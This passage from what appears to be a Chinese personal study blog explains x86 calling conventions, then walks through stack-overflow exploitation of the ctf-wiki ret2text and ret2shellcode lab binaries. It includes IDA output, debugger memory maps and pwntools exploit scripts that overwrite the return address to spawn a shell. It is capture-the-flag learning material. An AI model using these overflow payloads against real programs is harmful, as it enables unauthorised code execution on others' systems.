alt="image-20250209211754260"></p><p><strong>5.2调用约定的影响</strong></p><p> 当函数导出被其他程序员所使用(如库函数)时，该函数应遵循主要的调用约定，以便于程序员使用。若函数仅供内部使用，则其调用约定可只被使用该函数的程序所了解。</p><p>   在多语言混合编程(包括A语言中使用B语言开发的第三方库)时，若函数的原型声明和函数体定义不一致或调用函数时声明了不同的函数约定，将可能导致严重问题(如堆栈被破坏)。</p><p>   以Delphi调用C函数为例。Delphi函数缺省采用stdcall调用约定，而C函数缺省采用cdecl调用约定。一般将C函数声明为stdcall约定，如：int __stdcall add(int a, int b);</p><p>   在Delphi中调用该函数时也应声明为stdcall约定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1 function add(a: Integer; b: Integer): Integer; stdcall; //参数类型应与DLL中的函数或过程参数类型一致，且引用时使用stdcall参数<br>2 external &#x27;a.dll&#x27;; //指定被调DLL文件的路径和名称<br></code></pre></td></tr></table></figure><p>不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)。</p><p>   此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误(报告被调函数未定义)。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _cplusplus</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-function">type <span class="hljs-title">Func</span><span class="hljs-params">(type para)</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _cplusplus</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p> 这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。</p><p><strong>5.3 x86函数参数传递方法</strong></p><p>x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序(下标0<del>N-1)与函数参数声明顺序(Para1</del>N)一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。</p><p><strong>5.3.1  整型和指针参数的传递</strong></p><p>整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。</p><p><img src="/../00000000/image-20250209212130456.png" alt="image-20250209212130456"></p><p><strong>5.3.2 浮点数参数的传递</strong></p><p>浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。</p><p><strong>5.3.3 结构体和联合体的参数的传递</strong></p><p>   结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。</p><p>   对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。</p><p><strong>5.4 x86函数返回值的传递方法</strong></p><p>   函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时**：**</p><ol><li><p>若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。</p></li><li><p>若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</p></li><li><p>若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。</p></li><li><p>若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。</p><p>注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。</p></li><li><p>不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</p><p>函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">【扩展阅读】GCC返回结构体和联合体<br><br>通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。<br><br>GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。<br><br>相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。<br><br>在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。<br><br>GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。<br><br>在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。<br></code></pre></td></tr></table></figure><p>另外给出个寄存器的图解帮助理解：</p><p><img src="/../00000000/image-20250209212842623.png" alt="image-20250209212842623"></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p><ul><li>x86<ul><li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li></ul></li><li>x64<ul><li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li></ul></li></ul><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><p>文章给个一个例子可以看看，就是简单的gets函数的溢出利用：</p><p><strong>寻找危险函数</strong> <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_5">¶</a></p><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li><p>输入</p><ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li><p>输出</p><ul><li>sprintf</li></ul></li><li><p>字符串</p><ul><li><p>strcpy，字符串复制，遇到’\x00’停止</p></li><li><p>strcat，字符串拼接，遇到’\x00’停止</p></li><li><p>bcopy</p></li></ul></li></ul><p><strong>确定填充长度</strong> <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_6">¶</a></p><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>例题：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>这个题目和网站上给的ida结果有一点区别，但是题解相同，计算方法也相同</p><p>下面是对这个题目的分析：</p><p>checksec:</p><p><img src="/../00000000/image-20250214164926638.png" alt="image-20250214164926638"></p><p>ida32_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显是利用gets函数的漏洞</p><p>ida32_secure：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [esp+18h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> secretcode; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v0 = time(<span class="hljs-number">0</span>);<br>  srand(v0);<br>  secretcode = rand();<br>  __isoc99_scanf(&amp;unk_8048760, &amp;input);<br>  <span class="hljs-keyword">if</span> ( input == secretcode )<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到secure函数中调用了system(“bin&#x2F;sh”)</p><p>因为没有地址随机化，所以可以直接看getshell的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;<br>.text:08048641                 call    _system<br>.text:08048646<br></code></pre></td></tr></table></figure><p>看到getshell的地址是0x0804863A</p><p>然后开始计算溢出长度</p><p>ida看到gets函数的地址是：0x080486AE </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:080486AB                 mov     [esp], eax      ; s<br>.text:080486AE                 call    _gets<br>.text:080486B3                 mov     dword ptr [esp], offset format ; &quot;Maybe I will tell you next time !&quot;<br>.text:080486BA                 call    _printf<br></code></pre></td></tr></table></figure><p>用gdb在gets函数处下断点，看esp和ebp的情况来分析溢出的长度</p><p><img src="/../00000000/image-20250214170546473.png" alt="image-20250214170546473"></p><p>通过esp的偏移地址来确定变量的地址，再减去ebp的地址，再根据架构确定覆盖old_ebp的长度，最后加上返回地址，即可getshell</p><p>变量地址为：0xffffd02c</p><p>ebp:0xffffd098</p><p>溢出地址&#x3D; 0xffffd098 - 0xffffd02c &#x3D; 0x64</p><p>32位的程序，所以old_ebp的位置是32位，四个字节，所以再加4 最后加上getshell的返回地址即可</p><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r = process(&#x27;./ret2text&#x27;)<br><br>ret_addr = 0x0804863A<br>payload1 = b&#x27;a&#x27; * ( 0x64 + 4 ) + p32(ret_addr)<br><br>r.recvuntil(&#x27;There is something amazing here, do you know anything?&#x27;)<br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><strong>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_3">¶</a></strong></p><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><p>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</strong>。</p><p>例题：<br>这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。</p><p>文章提供的例题：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>例题分析：</p><p>checksec：</p><p><img src="/../00000000/image-20250215223748528.png" alt="image-20250215223748528"></p><p>ida32_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o<br>.bss:0804A080 _bss            ends<br></code></pre></td></tr></table></figure><p>从反编译的代码可以看出，依旧是简单的栈溢出，</p><p>还把s复制给了buf2，然后buf2在bss段上 [ 也就是可读可写可执行的位置 ]</p><p>但是这个时候没有后门函数，需要自己编写getshell的代码</p><p>再学习一下题目中的调试过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  b main<br>Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode <br><br>Breakpoint 1, main () at ret2shellcode.c:8<br>8       setvbuf(stdout, 0LL, 2, 0LL);<br>─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────<br>      6  int main(void)<br>      7  &#123;<br> →    8      setvbuf(stdout, 0LL, 2, 0LL);<br>      9      setvbuf(stdin, 0LL, 1, 0LL);<br>     10  <br>─────────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta prompt_">[#</span><span class="language-bash">0] 0x8048536 → Name: main()</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  vmmap <br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so<br>0xf7faf000 0xf7fb2000 0x00000000 rwx <br>0xf7fd3000 0xf7fd5000 0x00000000 rwx <br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rwx <br>0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so<br>0xfffdd000 0xffffe000 0x00000000 rwx [stack]<br></code></pre></td></tr></table></figure><p>在main函数下断点，一步步走</p><p>然后vmmap查看各个位置的权限，其实感觉在ida里看了也行，但是教程这样写的</p><p>粘贴的是我自己的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; vmmap<br>Start      End        Perm      Name<br>0x08048000 0x08049000 r-xp      /mnt/d/scr1w/stack_overflow/example/ret2shellcode/ret2shellcode<br>0x08049000 0x0804a000 r--p      /mnt/d/scr1w/stack_overflow/example/ret2shellcode/ret2shellcode<br>0x0804a000 0x0804b000 rw-p      /mnt/d/scr1w/stack_overflow/example/ret2shellcode/ret2shellcode<br>0xf7d82000 0xf7da2000 r--p      /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7da2000 0xf7f24000 r-xp      /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7f24000 0xf7fa9000 r--p      /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7fa9000 0xf7faa000 ---p      /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7faa000 0xf7fac000 r--p      /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7fac000 0xf7fad000 rw-p      /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7fad000 0xf7fb7000 rw-p      mapped<br>0xf7fbe000 0xf7fc0000 rw-p      mapped<br>0xf7fc0000 0xf7fc4000 r--p      [vvar]<br>0xf7fc4000 0xf7fc6000 r-xp      [vdso]<br>0xf7fc6000 0xf7fc7000 r--p      /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7fc7000 0xf7fec000 r-xp      /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7fec000 0xf7ffb000 r--p      /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7ffb000 0xf7ffd000 r--p      /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7ffd000 0xf7ffe000 rw-p      /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xfffdd000 0xffffe000 rwxp      [stack]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804a000 0x0804b000 rw-p      /mnt/d/scr1w/stack_overflow/example/ret2shellcode/ret2shellcode<br></code></pre></td></tr></table></figure><p>可以看到buf2的地址，0x0804A080的权限是可读可写不可执行</p><p><strong>但是题目的解析又不是这样的，我也不清楚为什么它的和我的不同</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">0x0804a000</span> <span class="hljs-number">0x0804b000</span> <span class="hljs-number">0x00001000</span> rwx <span class="hljs-regexp">/mnt/</span>hgfs<span class="hljs-regexp">/Hack/</span><span class="hljs-type">CTF</span><span class="hljs-operator">-</span><span class="hljs-type">Learn</span><span class="hljs-regexp">/pwn/</span>stack<span class="hljs-regexp">/example/</span>ret2shellcode<span class="hljs-operator">/</span>ret2shellcode<br></code></pre></td></tr></table></figure><p>最后也没办法用题目的exp getshell</p><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = process(&#x27;./ret2shellcode&#x27;)<br>shellcode = asm(shellcraft.sh())<br>buf2_addr = 0x804a080<br><br>sh.sendline(shellcode.ljust(112, b&#x27;A&#x27;) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>这行代码生成了一个简单的 Shellcode，其功能是调用 <code>/bin/sh</code>，从而启动一个 Shell。具体步骤如下：</p><ul><li><code>shellcraft.sh()</code>：这是一个 Pwntools 提供的 Shellcode 模板，用于生成一个简单的 Shellcode，其功能是调用 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，从而启动一个 Shell。</li><li><code>asm()</code>：将 <code>shellcraft.sh()</code> 生成的汇编代码转换为机器码。</li></ul><p>这个exp的核心部分就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">sh.sendline(shellcode.ljust(112, b&#x27;A&#x27;) + p32(buf2_addr))<br></code></pre></td></tr></table></figure><ol><li><strong><code>shellcode.ljust(112, b&#39;A&#39;)</code></strong>：<ul><li><code>ljust(112, b&#39;A&#39;)</code>：将 Shellcode 的长度填充到 112 字节。如果 Shellcode 的长度不足 112 字节，会用 <code>b&#39;A&#39;</code>（即 ASCII 字符 <code>A</code>）填充。</li><li>这里的 112 字节是根据目标程序的栈溢出漏洞设计的，目的是覆盖目标程序的栈空间，直到返回地址的位置。</li></ul></li><li><strong><code>p32(buf2_addr)</code></strong>：<ul><li><code>p32()</code>：将一个 32 位的地址转换为小端序（little-endian）的字节序列。例如，<code>0x804a080</code> 会被转换为 <code>b&#39;\x80\xa0\x04\x08&#39;</code>。</li><li>这里的 <code>buf2_addr</code> 是 Shellcode 的存储地址，通过覆盖目标程序的返回地址，使其跳转到 <code>buf2_addr</code>，从而执行 Shellcode。</li></ul></li><li><strong><code>sh.sendline()</code></strong>：<ul><li>将构造好的攻击数据发送到目标程序的标准输入中，触发栈溢出漏洞。</li></ul></li></ol><p>按照原理理解其实只是要把shellcode的代码写到一个有可执行权限的位置，根据vmmap来看，stack就是有可写可执行权限的位置</p><p>我的解题思路：</p><p>**总体：**利用pwntools编写getshell的机械码，再计算gets函数的溢出缓冲区长度，最后ret回到栈上执行getshell的机械码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 